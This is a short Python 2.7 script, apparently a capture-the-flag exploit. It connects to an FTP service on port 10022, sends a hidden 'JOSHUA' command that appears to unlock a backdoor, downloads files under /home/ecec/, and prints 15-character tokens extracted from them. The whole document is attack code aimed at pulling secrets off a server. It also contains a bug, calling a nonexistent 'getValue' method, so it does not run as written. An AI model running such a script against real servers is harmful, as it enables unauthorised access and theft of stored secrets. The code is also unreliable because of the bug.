#!/usr/bin/python2.7

import ftplib
import re
import sys
import StringIO

# Connection information
server = sys.argv[1]

ftp = ftplib.FTP()
ftp.connect(server, 10022)

# Hello, Mr. Falken :)
ftp.sendcmd('JOSHUA')

ftp.cwd('/home/ecec/')

# Loop through matching files and download each one individually
for filename in ftp.nlst('db'):

    tmp = StringIO.StringIO()
    ftp.retrbinary('RETR ' + filename, tmp.write)

    content = tmp.getValue()
    m = re.search(r'#([A-Z0-9]{15})#', content)
    if m:
        print m.group(1)

ftp.quit()
sys.exit(0)
